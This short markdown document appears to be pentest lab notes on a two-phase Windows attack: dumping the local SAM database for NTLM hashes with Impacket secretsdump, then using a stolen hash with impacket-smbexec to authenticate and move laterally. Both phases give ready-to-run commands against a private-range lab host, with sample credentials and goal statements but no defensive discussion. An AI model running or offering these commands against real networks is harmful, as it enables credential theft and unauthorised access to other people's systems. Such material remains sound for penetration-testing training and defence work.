## Attack: Two-phase attack: dump credentials, then authenticate using hash instead of password.

### Phase 1 - Credential Dumping:

- Connect to target machine with admin rights
- Dump local SAM database (contains password hashes)
- Extract NTLM hashes for local accounts

### Tool: Impacket secretsdump
```bash
impacket-secretsdump corp.local/user1:Password123!@192.168.57.101
```
**Goal**: Obtain password hashes for later use    
### Phase 2 - Pass-the-Hash:

- Use stolen NTLM hash to authenticate (no plaintext password needed)
- NTLM allows authentication with just the hash
- Gain access as compromised user

### Tool: Impacket smbexec with hash
```bash
impacket-smbexec corp.local/rocks@192.168.57.101 -hashes aad3b435b51404eeaad3b435b51404ee:HASH
```
**Goal**: Authenticate without knowing password, lateral movement

